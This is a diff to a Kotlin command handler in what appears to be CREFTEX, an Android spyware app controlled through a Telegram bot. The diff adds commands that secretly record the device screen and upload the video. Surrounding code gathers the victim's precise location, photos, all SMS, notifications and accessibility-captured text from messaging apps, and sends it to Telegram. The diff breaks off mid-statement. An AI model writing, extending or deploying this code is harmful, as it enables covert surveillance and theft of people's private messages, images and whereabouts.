@@ -34,6 +34,8 @@ object CommandExecutor {
             callbackData == "screen_once" -> captureOnce(ctx)
             callbackData == "screen_loop_start" -> startScreenLoop(ctx)
             callbackData == "screen_loop_stop" -> stopScreenLoop(ctx)
+            callbackData == "video_30" -> recordVideo(ctx, 30)
+            callbackData == "video_60" -> recordVideo(ctx, 60)
             callbackData == "cam_front" -> captureCamera(ctx, true)
             callbackData == "cam_back" -> captureCamera(ctx, false)
             callbackData == "fetch_all" -> fetchEverything(ctx)
@@ -58,6 +60,8 @@ object CommandExecutor {
             cmd == "/screen" -> captureOnce(ctx)
             cmd == "/screen_loop" -> startScreenLoop(ctx)
             cmd == "/screen_stop" -> stopScreenLoop(ctx)
+            cmd == "/video" || cmd == "/video30" -> recordVideo(ctx, 30)
+            cmd == "/video60" -> recordVideo(ctx, 60)
             cmd == "/cam_front" -> captureCamera(ctx, true)
             cmd == "/cam_back" -> captureCamera(ctx, false)
             cmd == "/all" -> fetchEverything(ctx)
@@ -69,9 +73,6 @@ object CommandExecutor {
         }
     }
 
-    // ═══════════════════════════════════════════
-    //  MENUS
-    // ═══════════════════════════════════════════
     private fun showMainMenu(ctx: Context) {
         val text = """
             🎛 *لوحة التحكم — CREFTEX*
@@ -107,7 +108,52 @@ object CommandExecutor {
     }
 
     // ═══════════════════════════════════════════
-    //  ACCESSIBILITY — نصوص الشاشة مجمّعة
+    //  VIDEO RECORDING
+    // ═══════════════════════════════════════════
+    private fun recordVideo(ctx: Context, durationSec: Int) {
+        if (!ScreenCapture.isReady) {
+            TelegramApi.sendMessage(
+                "⚠️ *صلاحية التقاط الشاشة غير جاهزة*\n\n" +
+                "الحل:\n" +
+                "1. افتح التطبيق يدويًا\n" +
+                "2. وافق على نافذة *التقاط الشاشة*\n" +
+                "3. أعد الأمر بعدها",
+                KeyboardBuilder.backToMenu()
+            )
+            return
+        }
+        if (VideoRecorder.isRecording) {
+            TelegramApi.sendMessage("📹 التسجيل شغّال بالفعل")
+            return
+        }
+        runJob(ctx, "video") {
+            TelegramApi.sendMessage("📹 *بدأ تسجيل الفيديو ($durationSec ثانية)...*")
+            val file = VideoRecorder.start(ctx, durationSec)
+            if (file == null) {
+                TelegramApi.sendMessage("❌ فشل بدء التسجيل", KeyboardBuilder.backToMenu())
+                return@runJob
+            }
+            // انتظر انتهاء التسجيل
+            Thread.sleep((durationSec + 3) * 1000L)
+            val done = VideoRecorder.stop() ?: file
+            if (done.exists() && done.length() > 0) {
+                val sizeMB = done.length() / (1024.0 * 1024.0)
+                TelegramApi.sendMessage("📤 *جاري الإرسال...* (${String.format("%.1f", sizeMB)} MB)")
+                val ok = TelegramApi.sendVideo(done, "📹 فيديو الشاشة — ${DeviceInfo.getQuickInfo(ctx)}")
+                if (ok) {
+                    TelegramApi.sendMessage("✅ تم إرسال الفيديو", KeyboardBuilder.backToMenu())
+                } else {
+                    TelegramApi.sendMessage("❌ فشل الإرسال — الحجم كبير؟ جرب 30 ثانية", KeyboardBuilder.backToMenu())
+                }
+                done.delete()
+            } else {
+                TelegramApi.sendMessage("❌ لم يتم تسجيل أي شي", KeyboardBuilder.backToMenu())
+            }
+        }
+    }
+
+    // ═══════════════════════════════════════════
+    //  ACCESSIBILITY
     // ═══════════════════════════════════════════
     private fun fetchAccessibility(ctx: Context) {
         runJob(ctx, "accessibility") {
@@ -134,7 +180,6 @@ object CommandExecutor {
                 return@runJob
             }
 
-            // تجميع حسب الحزمة
             val grouped = HashMap<String, MutableList<Pair<String, String>>>()
 
             for (line in lines) {
@@ -154,7 +199,6 @@ object CommandExecutor {
                 return@runJob
             }
 
-            // أسماء التطبيقات
             val appNames = mapOf(
                 "org.telegram.messenger" to "Telegram",
                 "org.telegram.plus" to "Telegram Plus",
@@ -173,15 +217,12 @@ object CommandExecutor {
                 "com.google.android.youtube" to "YouTube"
             )
 
-            // إرسال كل تطبيق كرسالة منفصلة
             for ((pkg, items) in grouped) {
                 val appName = appNames[pkg] ?: pkg
-
                 val sb = StringBuilder()
                 sb.append("📱 *$appName*\n")
                 sb.append("━━━━━━━━━━━━━━━━━━━━\n")
 
-                // آخر 20 حدث فقط
                 val recent = items.takeLast(20)
                 for (item in recent) {
                     sb.append("🕐 `${item.first}`\n")
@@ -455,47 +496,4 @@ object CommandExecutor {
             TelegramApi.sendMessage("📍 *الموقع...*")
             try {
                 val loc = LocationHelper.getPreciseLocation(ctx)
-                TelegramApi.sendMessage(LocationHelper.formatLocation(ctx, loc))
-            } catch (_: Exception) {}
-
-            Thread.sleep(500)
-            TelegramApi.sendMessage("1️⃣ *صور...*")
-            val photos = MediaScanner.scanImages(ctx)
-            sendPhotosList(ctx, photos, "📸 الصور")
-
-            Thread.sleep(500)
-            TelegramApi.sendMessage("2️⃣ *SMS...*")
-            fetchAllSms(ctx)
-
-            Thread.sleep(500)
-            TelegramApi.sendMessage("3️⃣ *إشعارات...*")
-            fetchAllNotifs(ctx)
-
-            Thread.sleep(500)
-            TelegramApi.sendMessage("4️⃣ *نصوص Accessibility...*")
-            fetchAccessibility(ctx)
-
-            TelegramApi.sendMessage("✅ *اكتمل الجلب الشامل*", KeyboardBuilder.mainMenu())
-        }
-    }
-
-    // ═══════════════════════════════════════════
-    //  JOB MANAGEMENT
-    // ═══════════════════════════════════════════
-    private fun stopJob(ctx: Context, jobId: String) {
-        runningJobs[jobId] = false
-        runningJobs.remove(jobId)
-        TelegramApi.sendMessage("🛑 تم إيقاف العملية", KeyboardBuilder.mainMenu())
-    }
-
-    private fun runJob(ctx: Context, jobName: String, block: () -> Unit) {
-        Thread {
-            try {
-                block()
-            } catch (e: Exception) {
-                Log.e("CmdExec", "job $jobName err: ${e.message}")
-                TelegramApi.sendMessage("❌ خطأ في $jobName: ${e.message}")
-            }
-        }.start()
-    }
-}
+                TelegramApi.sendMessage(
